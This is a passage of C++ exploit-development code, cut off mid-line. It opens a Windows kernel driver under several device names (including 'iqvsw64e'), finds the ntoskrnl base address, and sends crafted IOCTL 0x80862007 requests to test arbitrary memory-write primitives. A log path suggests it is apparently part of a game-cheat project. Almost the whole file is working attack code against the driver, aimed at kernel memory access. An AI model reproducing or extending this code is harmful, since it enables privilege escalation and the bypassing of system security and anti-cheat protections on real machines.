// p39.cpp v2 - tests against the decoded case tables.
#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <psapi.h>
#include <stdio.h>
#include <stdint.h>
#include <stdarg.h>
#include <string.h>
#pragma comment(lib, "psapi.lib")

typedef uint64_t u64; typedef uint32_t u32; typedef uint16_t u16; typedef uint8_t u8;

static HANDLE g_h = INVALID_HANDLE_VALUE;
static FILE*  g_log = nullptr;

static void L(const char* f, ...) {
    char s[2048]; va_list ap; va_start(ap, f);
    vsnprintf(s, sizeof s, f, ap); va_end(ap);
    printf("%s\n", s); fflush(stdout);
    if (g_log) { fprintf(g_log, "%s\n", s); fflush(g_log); }
}

struct Req {
    u8 raw[0x200];
    void clear() { memset(raw, 0, sizeof raw); }
    void q(u32 o, u64 v) { memcpy(raw + o, &v, 8); }
    void d(u32 o, u32 v) { memcpy(raw + o, &v, 4); }
    u64  Q(u32 o) const { u64 v; memcpy(&v, raw + o, 8); return v; }
    u32  D(u32 o) const { u32 v; memcpy(&v, raw + o, 4); return v; }
};

static u8  g_dst[0x2000];
static u64 g_dstVA = 0;

static DWORD Call(DWORD io, Req& r, DWORD len) {
    DWORD br = 0;
    return DeviceIoControl(g_h, io, r.raw, len, r.raw, len, &br, nullptr) ? 0 : GetLastError();
}
static u64 NtBase() {
    LPVOID m[1024]; DWORD n = 0;
    if (!EnumDeviceDrivers(m, sizeof m, &n) || !n) return 0;
    return (u64)(ULONG_PTR)m[0];
}
static void Dump(const char* t, Req& r) {
    for (u32 o = 0; o < 0x40; o += 0x20)
        L("   %s +%02X %016llX %016llX %016llX %016llX", t, o, r.Q(o), r.Q(o+8), r.Q(o+16), r.Q(o+24));
}

int main() {
    g_dstVA = (u64)(ULONG_PTR)g_dst;
    g_log = fopen("C:\\r6esp\\p39.log", "w");
    L("=== p39 v2 - decoded-case-table tests ===");

    const wchar_t* paths[] = { L"\\\\.\\NAL_1_5", L"\\\\.\\NAL_2_5", L"\\\\.\\Nal", L"\\\\.\\NAL", L"\\\\.\\iqvsw64e" };
    for (const wchar_t* p : paths) {
        g_h = CreateFileW(p, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
        if (g_h != INVALID_HANDLE_VALUE) { L("open %ls ok", p); break; }
    }
    if (g_h == INVALID_HANDLE_VALUE) { L("no device"); return 1; }
    u64 nt = NtBase();
    L("ntoskrnl=%016llX dst=%016llX", nt, g_dstVA);

    L("\n--- A. 0x80862007 writes 0x13/0x14/0x15 -> our buffer (checked in user mode) ---");
    memset(g_dst, 0, 0x100);
    {
        Req r; r.clear(); r.q(0,0x15); r.q(8,0x18); r.q(0x18,g_dstVA+0x40); r.d(0x20,0xAABBCCDD);
        DWORD e = Call(0x80862007, r, 0x48);
        L("A wr32 err=%lu buf[+40]=%08X %s", e, *(u32*)(g_dst+0x40), *(u32